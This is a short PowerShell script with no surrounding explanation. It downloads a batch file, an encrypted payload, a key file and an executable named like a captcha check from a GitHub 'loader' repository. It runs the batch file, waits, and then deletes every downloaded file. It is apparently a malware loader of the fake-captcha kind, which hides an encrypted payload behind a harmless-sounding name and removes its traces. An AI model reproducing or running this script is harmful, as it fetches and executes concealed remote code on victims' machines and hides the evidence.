# Define the download location
$downloadPath = "C:\MyDownloads"
# Create the directory if it doesn't exist
if (-not (Test-Path -Path $downloadPath)) { New-Item -ItemType Directory -Path $downloadPath }

# Download files
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/main.bat" -OutFile "$downloadPath\main.bat"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/cipher.bin" -OutFile "$downloadPath\cipher.bin"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/key.bin" -OutFile "$downloadPath\key.bin"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/Captcha-Authentication-Process-820182.exe" -OutFile "$downloadPath\Captcha-Authentication-Process-820182.exe"

# Run main.bat
Start-Process -FilePath "$downloadPath\main.bat" -NoNewWindow

# Wait for 10 seconds
Start-Sleep -Seconds 20

# Delete all downloaded files
Remove-Item -Path "$downloadPath\*"
